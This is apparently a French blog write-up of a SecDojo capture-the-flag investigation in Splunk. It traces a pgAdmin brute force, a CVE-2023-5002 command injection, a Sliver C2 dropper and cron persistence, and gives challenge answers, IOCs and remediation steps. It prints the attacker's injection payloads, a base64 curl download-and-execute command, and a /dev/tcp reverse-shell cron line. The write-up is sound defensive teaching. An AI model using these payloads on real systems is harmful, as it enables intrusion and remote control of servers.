---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Tusker : investigation Splunk d'un Brute Force → Command Injection (CVE-2023-5002) → C2 Sliver"
date: 2026-10-15
categories: [DFIR, SOC]
tags: [dfir, splunk, spl, pgadmin, cve-2023-5002, command-injection, brute-force, sliver-c2, cron, mitre-attck, t1053-003, secdojo, ctf]
---

# Challenge Tusker : investigation Splunk d'une exploitation pgAdmin (CVE-2023-5002)

> **Plateforme :** SecDojo
> **Date de l'incident :** 28 avril 2026
> **CVE exploitée :** CVE-2023-5002 — Command Injection dans pgAdmin < 7.7
> **Résultat :** ✅ chaîne d'attaque complète reconstituée via Splunk, du brute force à la persistance C2

## Table des matières

1. [Sources de données disponibles](#1-sources-de-données-disponibles-q1)
2. [Première attaque — Brute Force](#2-première-attaque--brute-force-q2-q3-q4-q5)
3. [Exploitation CVE-2023-5002 — Command Injection](#3-exploitation-cve-2023-5002--command-injection-q6-q7-q8)
4. [Framework C2 — Sliver](#4-framework-c2--sliver-q10)
5. [Persistance — Cron Job](#5-persistance--cron-job-q12-q13)
6. [Tableau récapitulatif des réponses](#6-tableau-récapitulatif-des-réponses)
7. [Indicateurs de compromission (IOCs)](#7-indicateurs-de-compromission-iocs)
8. [Recommandations de remédiation](#8-recommandations-de-remédiation)

## 1. Sources de données disponibles (Q1)

La première étape de toute investigation DFIR dans Splunk est de recenser les sources de logs disponibles.

```spl
| metadata type=sources index=* | table source, totalCount, recentTime
```

**Explication de la commande :**

- `| metadata type=sources` — liste toutes les sources de données indexées dans Splunk
- `index=*` — recherche dans tous les index disponibles
- `| table source, totalCount, recentTime` — affiche le nom, le nombre d'événements et la date du dernier événement

**Résultat obtenu :**

| Source | Événements | Contenu |
| --- | --- | --- |
| `nginx:plus:access` | 1509 | Logs proxy nginx |
| `linux:audit` | 1118 | Logs audit système Linux |
| `pgadmin:log` | 244 | Logs applicatifs pgAdmin |
| `apache:access` | — | Logs serveur Apache |

**Réponse Q1 :** `apache` (C), `nginx` (D), `pgadmin` (F), `audit` (G)

## 2. Première attaque — Brute Force (Q2, Q3, Q4, Q5)

Après avoir identifié les sources, on recherche les premiers signes d'activité malveillante dans les logs pgAdmin.

### 2.1 Identification de l'attaque (Q2)

```spl
index=* sourcetype=pgadmin:log | sort _time asc | head 50 | table _time, _raw
```

**Explication de la commande :**

- `index=* sourcetype=pgadmin:log` — filtre uniquement les logs de l'application pgAdmin
- `| sort _time asc` — trie les événements du plus ancien au plus récent
- `| head 50` — affiche les 50 premiers événements
- `| table _time, _raw` — affiche le timestamp et le contenu brut de chaque log

**Résultat & analyse :**

On observe l'IP `13.53.105.255` qui envoie des requêtes POST répétitives sur `/authenticate/login` toutes les ~7 secondes avec un code retour `302` (redirect vers `/login` = échec d'authentification). C'est le comportement typique d'une attaque par **Brute Force**.

```text
13.53.105.255 - - [28/Apr/2026 00:36:35] "POST /authenticate/login HTTP/1.1" 302 -
13.53.105.255 - - [28/Apr/2026 00:36:41] "POST /authenticate/login HTTP/1.1" 302 -
13.53.105.255 - - [28/Apr/2026 00:36:48] "POST /authenticate/login HTTP/1.1" 302 -
```

**Réponse Q2 :** Brute Force
**Réponse Q3 :** `2026-04-28 00:36:35` (premier POST `/authenticate/login`)
**Réponse Q5 :** `13.53.105.255` (IP source des requêtes répétitives)

### 2.2 Identification du compte compromis (Q4)

```spl
index=* sourcetype=pgadmin:log ("Logged in" OR "logged in") | table _time, _raw
```

**Explication de la commande :**

- `"Logged in"` — recherche le message de connexion réussie que pgAdmin logue automatiquement
- Cette requête permet de distinguer les tentatives échouées (302 vers `/login`) du login réussi

**Résultat obtenu :**

```text
2026-04-28 00:38:30,367: INFO pgadmin: Internal user user@domain.com logged in.
```

Après ~2 minutes de brute force (de `00:36:35` à `00:38:30`), l'attaquant a trouvé le bon mot de passe.

**Réponse Q4 :** `user@domain.com`

## 3. Exploitation CVE-2023-5002 — Command Injection (Q6, Q7, Q8)

**CVE-2023-5002** est une vulnérabilité de type Command Injection dans pgAdmin versions < 7.7. L'endpoint `/misc/validate_binary_path`, utilisé pour valider le chemin vers `pg_dump`/`pg_restore`, ne sanitise pas correctement les entrées utilisateur.

### 3.1 Identification de l'attaque enchaînée (Q6)

```spl
index=* sourcetype=pgadmin:log "13.53.105.255" | search _time > "2026-04-28 00:38:30" | table _time, _raw | sort _time asc
```

**Explication de la commande :**

- `"13.53.105.255"` — filtre tous les logs liés à l'IP de l'attaquant
- `_time > "2026-04-28 00:38:30"` — recherche uniquement après le login réussi
- Permet d'identifier les actions post-authentification de l'attaquant

**Résultat & analyse :**

```text
00:45:54 POST /misc/validate_binary_path HTTP/1.1 200
00:47:58 POST /misc/validate_binary_path HTTP/1.1 200
00:48:12 POST /misc/validate_binary_path HTTP/1.1 200
00:50:16 POST /misc/validate_binary_path HTTP/1.1 200
```

L'attaquant envoie plusieurs requêtes POST vers `/misc/validate_binary_path` — c'est l'endpoint vulnérable de CVE-2023-5002.

**Réponse Q6 :** Command Injection (CVE-2023-5002)

### 3.2 Payloads utilisés (Q7 & Q8)

```spl
index=* sourcetype=pgadmin:log "POST Body" | table _time, _raw | sort _time asc
```

**Explication de la commande :**

- `"POST Body"` — pgAdmin logue le corps des requêtes POST avec ce préfixe
- Permet de voir le contenu exact des payloads envoyés par l'attaquant
- Sans ce filtre, on ne verrait que les métadonnées HTTP (méthode, chemin, status)

**Chronologie des payloads :**

**Payload 1 — Test initial (`00:45:54`) :**

```json
{"utility_path":"/var/lib/pgadmin/storage/user_domain.com/\";id;#"}
```

L'attaquant injecte `;id;#` pour tester si la commande `id` s'exécute. Le `;` termine le chemin légitime, `id` est la commande injectée, `#` commente le reste.

**Payload 2 — Test pwd (`00:47:58` & `00:48:12`) :**

```json
{"utility_path":"/var/lib/pgadmin/storage/user_domain.com/\";pwd;#"}
```

L'attaquant vérifie le répertoire courant pour confirmer l'exécution de commandes.

**Payload 3 — Reverse shell dropper (`00:50:16`) :**

```json
{"utility_path":"/var/lib/pgadmin/storage/user_domain.com/\";echo Y3VybCBodHRwOi8vMTcyLjE2LjE0MS4yMDQ6ODg4OC9UUkFHSUNfQU5BR1JBTSAtLW91dHB1dCAvdG1wL2Ryb3BwZXJ4ICYmIGNobW9kICt4IC90bXAvZHJvcHBlcnggJiYgYmFzaCAtYyAvdG1wL2Ryb3BwZXJ4 | base64 -d | sh;#"}
```

Décodage du Base64 :

```bash
curl http://172.16.141.204:8888/TRAGIC_ANAGRAM --output /tmp/dropperx && chmod +x /tmp/dropperx && bash -c /tmp/dropperx
```

**Explication du payload final :**

- `echo <base64> | base64 -d | sh` — encode la commande en base64 pour éviter les caractères spéciaux
- `curl http://172.16.141.204:8888/TRAGIC_ANAGRAM` — télécharge le dropper C2 depuis le serveur de l'attaquant
- `--output /tmp/dropperx` — sauvegarde le dropper dans `/tmp` sous le nom `dropperx`
- `chmod +x /tmp/dropperx` — rend le dropper exécutable
- `bash -c /tmp/dropperx` — exécute le dropper (implant Sliver C2)

**Réponse Q7 :** `/var/lib/pgadmin/storage/user_domain.com/";id;#`
**Réponse Q8 :** payload Base64 complet (voir ci-dessus)

## 4. Framework C2 — Sliver (Q10)

Après l'exécution du dropper `/tmp/dropperx`, l'attaquant établit une connexion C2 persistante vers son serveur.

```spl
index=* sourcetype=linux:audit type=EXECVE | search _raw="*dropperx*" OR _raw="*TRAGIC*" OR _raw="*172.16.141.204*" | table _time, _raw | sort _time asc
```

**Explication de la commande :**

- `type=EXECVE` — filtre les événements d'exécution de commandes dans les logs audit Linux
- `_raw="*dropperx*"` — recherche toute mention du fichier malveillant
- `OR _raw="*172.16.141.204*"` — recherche toute connexion vers l'IP du C2

**Identification du framework :**

Le binaire `/tmp/dropperx` est un implant **Sliver C2**. Les indicateurs sont :

- Connexion C2 vers `172.16.141.204:8888` (téléchargement)
- Connexion reverse shell vers `172.16.141.204:4444`
- Nom de payload `TRAGIC_ANAGRAM` — convention de nommage typique de Sliver
- Requêtes POST `/misc/cleanup` répétées — keepalive C2 de Sliver
- Erreurs `Bad HTTP/0.9 request` — handshake TLS de Sliver mal interprété par pgAdmin

**Réponse Q10 :** Sliver (framework C2 open-source écrit en Go, développé par Bishop Fox)

## 5. Persistance — Cron Job (Q12, Q13)

### 5.1 Identification de la technique (Q12)

```spl
index=* sourcetype=linux:audit type=EXECVE uid=1000 | search _time > "2026-04-28 00:50:00" | search _raw="*cron*" OR _raw="*crontab*" | table _time, _raw | sort _time asc
```

**Explication de la commande :**

- `type=EXECVE` — filtre les exécutions de commandes
- `uid=1000` — filtre les commandes exécutées par l'utilisateur `ubuntu` (uid 1000)
- `_time > "2026-04-28 00:50:00"` — recherche après l'exploitation
- `_raw="*crontab*"` — recherche l'utilisation de crontab pour la persistance

**Résultat obtenu :**

```text
2026-04-28 01:57:20 comm="crontab" exe="/usr/bin/crontab" UID="ubuntu" (argc=2 a1="-")
2026-04-28 01:57:20 comm="crontab" exe="/usr/bin/crontab" UID="ubuntu" (argc=2 a1="-l")
2026-04-28 02:00:25 comm="crontab" exe="/usr/bin/crontab" UID="ubuntu" (argc=2 a1="-")
2026-04-28 02:00:47 comm="crontab" exe="/usr/bin/crontab" UID="ubuntu" (argc=2 a1="-")
```

`crontab -` (écriture stdin) et `crontab -l` (lecture) indiquent que l'attaquant a ajouté une entrée dans la crontab.

**Réponse Q12 :** T1053.003 — Scheduled Task/Job: Cron (MITRE ATT&CK)

### 5.2 Commande de persistance (Q13)

```spl
index=* sourcetype=linux:audit | search _raw="*cron.d*" OR _raw="*persist*" OR _raw="*4444*" | table _time, _raw | sort _time asc
```

**Commande exacte de persistance :**

```bash
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/172.16.141.204/4444 0>&1") | crontab -
```

**Explication de la commande :**

- `crontab -l` — liste la crontab existante pour ne pas l'écraser
- `echo "* * * * * ..."` — ajoute une nouvelle entrée cron
- `* * * * *` — s'exécute toutes les minutes (min, heure, jour, mois, jour_semaine)
- `bash -i >& /dev/tcp/172.16.141.204/4444 0>&1` — reverse shell bash vers le C2
- `| crontab -` — écrit le résultat dans la crontab via stdin

**Réponse Q13 :**

```bash
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/172.16.141.204/4444 0>&1") | crontab -
```

## 6. Tableau récapitulatif des réponses

| Question | Réponse | Source / Commande SPL clé |
| --- | --- | --- |
| Q1 — Data sources | `apache, nginx, pgadmin, audit` | `\| metadata type=sources index=*` |
| Q2 — 1ère attaque | Brute Force | `index=* sourcetype=pgadmin:log \| sort _time asc` |
| Q3 — Timestamp début | `2026-04-28 00:36:35` | Premier POST `/authenticate/login` |
| Q4 — Compte compromis | `user@domain.com` | `index=* sourcetype=pgadmin:log "Logged in"` |
| Q5 — IP attaquant | `13.53.105.255` | Source des requêtes POST répétitives |
| Q6 — 2e attaque | Command Injection | POST `/misc/validate_binary_path` |
| Q7 — Premier payload | `...user_domain.com/";id;#` | `index=* sourcetype=pgadmin:log "POST Body"` |
| Q8 — Payload final | `...echo <b64> \| base64 -d \| sh;#` | `index=* sourcetype=pgadmin:log "POST Body"` |
| Q10 — Framework C2 | Sliver | Analyse du dropper `/tmp/dropperx` |
| Q12 — MITRE Persistence | T1053.003 (Cron) | `index=* sourcetype=linux:audit uid=1000 crontab` |
| Q13 — Cmd persistence | `(crontab -l; echo ...) \| crontab -` | Analyse post-exploitation via C2 |

## 7. Indicateurs de compromission (IOCs)

| Type IOC | Valeur |
| --- | --- |
| IP attaquant | `13.53.105.255` |
| Serveur C2 | `172.16.141.204` |
| Port téléchargement dropper | `8888` |
| Port reverse shell | `4444` |
| Nom payload C2 | `TRAGIC_ANAGRAM` |
| Fichier malveillant | `/tmp/dropperx` |
| Compte compromis | `user@domain.com` |
| CVE exploitée | CVE-2023-5002 (pgAdmin < 7.7) |
| Endpoint vulnérable | `/misc/validate_binary_path` |
| Crontab persistance | `* * * * * bash -i >& /dev/tcp/172.16.141.204/4444 0>&1` |

## 8. Recommandations de remédiation

- Mettre à jour pgAdmin vers la version 7.7 ou supérieure (patch CVE-2023-5002).
- Réinitialiser immédiatement le mot de passe du compte `user@domain.com`.
- Bloquer l'IP `13.53.105.255` au niveau du firewall.
- Bloquer toutes les connexions sortantes vers `172.16.141.204` (ports 4444, 8888).
- Supprimer le fichier malveillant `/tmp/dropperx`.
- Purger la crontab de l'utilisateur `ubuntu`.
- Implémenter un rate limiting sur `/authenticate/login` (max 5 tentatives / minute).
- Activer l'authentification multi-facteurs (MFA) sur pgAdmin.
- Restreindre l'accès à pgAdmin aux seules IPs internes autorisées.
- Auditer toutes les commandes exécutées depuis le compte compromis.

## Références

- CVE-2023-5002 — pgAdmin Command Injection (`/misc/validate_binary_path`)
- Technique MITRE ATT&CK **T1053.003** — Scheduled Task/Job: Cron
- Sliver C2 — framework de post-exploitation open-source (Bishop Fox)
